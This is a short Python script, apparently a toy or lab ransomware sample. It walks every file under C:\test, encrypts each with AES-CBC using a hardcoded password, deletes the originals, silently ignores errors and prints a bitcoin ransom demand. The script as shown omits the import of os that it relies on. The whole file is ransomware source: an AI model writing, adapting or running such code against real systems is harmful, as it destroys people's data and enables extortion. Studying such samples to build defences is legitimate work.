#!/usr/bin/env python3
from hashlib import md5
from Cryptodome.Cipher import AES
from os import urandom

def run_scandir(dir):    # dir: str, ext: list
    subfolders, files = [], []

    for f in os.scandir(dir):
        if f.is_dir():
            subfolders.append(f.path)
        if f.is_file():
            files.append(f.path)


    for dir in list(subfolders):
        sf, f = run_scandir(dir)
        subfolders.extend(sf)
        files.extend(f)
    return subfolders, files

def derive_key_and_iv(password, salt, key_length, iv_length): #derive key and IV from password and salt.
    d = d_i = b''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + str.encode(password) + salt).digest() #obtain the md5 hash value
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]

def encrypt(in_file, out_file, password, key_length=32):
    bs = AES.block_size #16 bytes
    salt = urandom(bs) #return a string of random bytes
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    out_file.write(salt)
    finished = False

    while not finished:
        chunk = in_file.read(1024 * bs) 
        if len(chunk) == 0 or len(chunk) % bs != 0:#final block/chunk is padded before encryption
            padding_length = (bs - len(chunk) % bs) or bs
            chunk += str.encode(padding_length * chr(padding_length))
            finished = True
        out_file.write(cipher.encrypt(chunk))
        
password = '9876512345' #USed for creating a key
subfolders, files = run_scandir("C:\\test")
for each in files:
    try:
        with open(each, 'rb') as in_file, open(each+'e', 'wb') as out_file:
            encrypt(in_file, out_file, password)
        os.remove(each)
        os.rename(each+'e', each)
    except:
        pass

print("Your drive has been taken over by Ransomware. Send a bitcoin to 9876543234567890 to recover the files")